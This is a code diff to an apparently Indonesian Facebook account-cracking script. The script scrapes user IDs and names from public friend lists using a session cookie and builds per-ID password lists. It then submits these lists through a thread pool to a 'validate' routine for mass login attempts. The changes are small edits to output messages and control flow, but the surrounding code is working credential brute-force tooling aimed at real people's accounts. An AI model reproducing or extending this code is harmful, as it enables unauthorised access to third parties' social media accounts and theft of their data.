@@ -380,8 +380,7 @@ class Dump:
 			return uid
 		except:
 			pass
-
-	###----------[ DUMP ID PUBLIK ]---------- ###
+    ###----------[ DUMP ID PUBLIK ]---------- ###
 	def Dump_Publik(self,url):
 		try:
 			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
@@ -391,11 +390,13 @@ class Dump:
 					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
 					if uid+"|"+nama in id:pass
 					else:id.append(uid+"|"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(id)} id....", end="\r")
+					console.print(f" {H2}• {P2}Berhasil mengumpulkan %s ID"%(id))
 			for x in url.find_all("a",href=True):
 				if "Lihat Teman Lain" in x.text:
 					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
 		except:pass
+			
+
           
 def cektahun(fx):
     if len(fx) == 15:
@@ -458,7 +459,6 @@ def cektahun(fx):
 
 # -------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-    method.append("validate")
     Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ["y", "Ya", "ya", "Y"]:
@@ -562,10 +562,9 @@ def passwrd():
                         pwv.append(xpwd)
                 else:
                     pass
-                if "validate" in method:
-                    pool.submit(validate, idf, pwv)
-                else:
-                    pool.submit(validate, idf, pwv)
+                
+                pool.submit(validate, idf, pwv)
+
         print("")
     Console().print(
         Panel(
